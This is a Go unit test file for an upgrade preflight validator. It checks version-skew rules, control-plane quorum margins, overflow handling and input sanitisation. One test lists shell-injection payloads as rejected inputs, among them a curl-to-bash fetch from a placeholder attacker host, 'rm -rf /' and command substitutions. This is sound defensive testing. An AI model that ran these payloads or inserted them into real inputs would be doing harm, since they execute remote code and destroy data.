package upgrade

import (
	"strings"
	"testing"
)

func cpNodes(ver string, ready int) []Node { return cpNodesOf(3, ver, ready) }

func cpNodesOf(total int, ver string, ready int) []Node {
	var ns []Node
	for i := 0; i < total; i++ {
		ns = append(ns, Node{Name: "cp", IsCP: true, Ready: i < ready, Version: ver})
	}
	return ns
}

func TestPreflight(t *testing.T) {
	tests := []struct {
		name   string
		target string
		nodes  []Node
		wantOK bool
	}{
		{"one minor up", "v1.36.2", cpNodes("v1.35.6", 3), true},
		{"patch bump", "v1.36.3", cpNodes("v1.36.2", 3), true},
		{"patch downgrade rejected", "v1.36.1", cpNodes("v1.36.2", 3), false},
		{"patch downgrade across two", "v1.36.0", cpNodes("v1.36.2", 3), false},
		{"patch bump still allowed", "v1.36.3", cpNodes("v1.36.2", 3), true},
		{"same version", "v1.36.2", cpNodes("v1.36.2", 3), true},
		{"downgrade rejected", "v1.35.6", cpNodes("v1.36.2", 3), false},
		{"minor skip rejected", "v1.38.0", cpNodes("v1.36.2", 3), false},
		{"bad target rejected", "nope", cpNodes("v1.36.2", 3), false},
		{"cp not quorum rejected", "v1.36.2", cpNodes("v1.35.6", 1), false},
		// 2/3 is quorum, but not once the next Ready one is drained: the
		// rollout can reach a Ready member first.
		{"cp 2/3 rejected: no margin to drain", "v1.36.2", cpNodes("v1.35.6", 2), false},
		{"cp 2/3 at target rejected", "v1.36.2", cpNodes("v1.36.2", 2), false},
		{"cp 4/5 ok: one down, one draining, 3 left", "v1.36.2", cpNodesOf(5, "v1.35.6", 4), true},
		{"cp 3/5 rejected", "v1.36.2", cpNodesOf(5, "v1.35.6", 3), false},
		{"single cp ok", "v1.36.2", cpNodesOf(1, "v1.35.6", 1), true},

		// The target is user input and is held to exact vMAJOR.MINOR.PATCH.
		// "1.36" and "v1.36.2+build" are rejected as TARGETS while staying valid
		// as observed node versions
		// (covered by TestPreflightKeepsGatesArmedOnSuffixedNodeVersions).
		{"target without v rejected", "1.36.2", cpNodes("v1.35.6", 3), false},
		{"target without patch rejected", "v1.36", cpNodes("v1.35.6", 3), false},
		{"target with build metadata rejected", "v1.36.2+build", cpNodes("v1.35.6", 3), false},
		{"target with leading zero rejected", "v01.36.2", cpNodes("v1.35.6", 3), false},

		// Cross-major: major/minor comparison alone accepts both of these as
		// "minor 36" and drives a real rollout against a v1.35 cluster.
		{"cross-major up rejected", "v99.36.2", cpNodes("v1.35.6", 3), false},
		{"cross-major down rejected", "v0.36.2", cpNodes("v1.35.6", 3), false},
		{"cross-major adjacent rejected", "v2.0.0", cpNodes("v1.35.6", 3), false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reason := Preflight(tt.target, tt.nodes)
			if (reason == "") != tt.wantOK {
				t.Errorf("Preflight = %q, wantOK=%v", reason, tt.wantOK)
			}
		})
	}
}

// A build-suffixed target is refused with the version to use instead, the same
// advice the per-node path gives (TestTargetMismatchSaysWhatToDo).
func TestPreflightSuffixedTargetNamesBareVersion(t *testing.T) {
	for target, want := range map[string]string{
		"v1.37.1-stratum.0-rc.3": "use --target v1.37.1, not \"v1.37.1-stratum.0-rc.3\"",
		"v1.37.1-stratum.0":      "use --target v1.37.1, not \"v1.37.1-stratum.0\"",
		// The base is not a version either: no advice to give.
		"nope-stratum.0":  "target must be vMAJOR.MINOR.PATCH",
		"v1.37-rc.1":      "target must be vMAJOR.MINOR.PATCH",
		"v1.37.1-x\nboom": "use --target v1.37.1, not \"v1.37.1-x\\nboom\"",
	} {
		if reason := Preflight(target, cpNodes("v1.36.2", 3)); !strings.Contains(reason, want) {
			t.Errorf("Preflight(%q) = %q, want it to contain %q", target, reason, want)
		}
	}
}

// TestPreflightRejectsInjectionTargets is the CVE-class case: every payload
// here passed preflight before the split and reached a node annotation, and on
// the CLI path a shell.
func TestPreflightRejectsInjectionTargets(t *testing.T) {
	for _, target := range []string{
		"v1.36.2; curl http://attacker/x | bash",
		"v1.36; curl http://attacker/x | bash",
		"v1.36.$(id)",
		"v1.36.2`id`",
		"v1.36.2 && id",
		"v1.36.2\nrm -rf /",
		"v1.36.2 --skip-snapshot",
	} {
		if reason := Preflight(target, cpNodes("v1.35.6", 3)); reason == "" {
			t.Errorf("Preflight(%q) accepted an injection payload", target)
		}
	}
}

// TestPreflightKeepsGatesArmedOnSuffixedNodeVersions is the fail-open
// regression guard. Distribution-suffixed kubelet versions must still parse; if
// they stop, no node version parses, Preflight's `seen` stays false, and it
// silently skips BOTH the downgrade and the minor-skip check instead of
// rejecting anything.
func TestPreflightKeepsGatesArmedOnSuffixedNodeVersions(t *testing.T) {
	for _, nodeVer := range []string{
		"v1.36.2+build",
		"v1.36.2+k3s1",
		"v1.36.2-eks-a1b2c3",
		"v1.36.2-gke.1449000",
		"1.36.2",
	} {
		if reason := Preflight("v1.35.6", cpNodes(nodeVer, 3)); reason == "" {
			t.Errorf("nodes at %q: downgrade to v1.35.6 was ALLOWED — the gate is disarmed", nodeVer)
		}
		if reason := Preflight("v1.38.0", cpNodes(nodeVer, 3)); reason == "" {
			t.Errorf("nodes at %q: minor skip to v1.38.0 was ALLOWED — the gate is disarmed", nodeVer)
		}
		if reason := Preflight("v1.37.0", cpNodes(nodeVer, 3)); reason != "" {
			t.Errorf("nodes at %q: legal +1 minor rejected: %s", nodeVer, reason)
		}
	}
}

// A rejected target is echoed into user-facing text; it must not be able to
// smuggle raw control characters into a log line or a CR status message.
func TestPreflightQuotesRejectedTarget(t *testing.T) {
	reason := Preflight("v1.36.2\nrm -rf /", cpNodes("v1.35.6", 3))
	if reason == "" {
		t.Fatal("expected rejection")
	}
	for _, r := range reason {
		if r == '\n' || r == '\r' || r == '\t' {
			t.Errorf("rejection reason carries a raw control character: %q", reason)
		}
	}
}

// The lagging node, not the cluster maximum, must bound the skew and
// cross-major gates. `stratum upgrade --cluster` halts on the first node failure
// ("halting; later nodes untouched"), so a mixed cluster is the normal state
// after a failed rollout — and the next attempt is preflighted against it.
func TestPreflightUsesTheLaggingNodeForSkewAndMajor(t *testing.T) {
	mixed := func(vers ...string) []Node {
		var ns []Node
		for _, v := range vers {
			ns = append(ns, Node{Name: "n", IsCP: true, Ready: true, Version: v})
		}
		return ns
	}
	tests := []struct {
		name   string
		target string
		nodes  []Node
		wantOK bool
	}{
		{"laggard would skip two minors", "v1.37.0", mixed("v1.35.6", "v1.36.2", "v1.36.2"), false},
		{"laggard would skip four minors", "v1.37.0", mixed("v1.33.0", "v1.36.2", "v1.36.2"), false},
		{"laggard would cross a major", "v2.1.0", mixed("v1.36.2", "v2.0.0", "v2.0.0"), false},
		{"resuming a half-done rollout still allowed", "v1.36.2", mixed("v1.35.6", "v1.36.2"), true},
		{"uniform cluster, legal +1 minor", "v1.36.2", mixed("v1.35.6", "v1.35.6"), true},
		{"downgrade still caught off the highest node", "v1.35.6", mixed("v1.35.6", "v1.36.2"), false},
		{"cross-major downgrade rejected", "v1.36.2", mixed("v1.36.2", "v2.0.0"), false},
		{"deep cross-major downgrade rejected", "v1.0.0", mixed("v1.36.2", "v2.0.0", "v2.0.0"), false},
		{"straddling cluster rejects even its own low major", "v1.37.0", mixed("v1.36.2", "v2.0.0"), false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if reason := Preflight(tt.target, tt.nodes); (reason == "") != tt.wantOK {
				t.Errorf("Preflight = %q, wantOK=%v", reason, tt.wantOK)
			}
		})
	}
}

// A component can satisfy the target pattern and still overflow an int; the
// parsed numbers must not be trusted when that happens.
func TestPreflightRejectsOverflowingTarget(t *testing.T) {
	for _, target := range []string{"v99999999999999999999.36.2", "v1.99999999999999999999.2"} {
		if reason := Preflight(target, cpNodes("v1.35.6", 3)); reason == "" {
			t.Errorf("Preflight(%q) accepted an overflowing target", target)
		}
		// The dangerous case: no node version parses, so the gates are skipped
		// and only the target check stands between this and the node argv.
		if reason := Preflight(target, cpNodes("unparseable", 3)); reason == "" {
			t.Errorf("Preflight(%q) with no parseable node versions accepted an overflowing target", target)
		}
	}
}
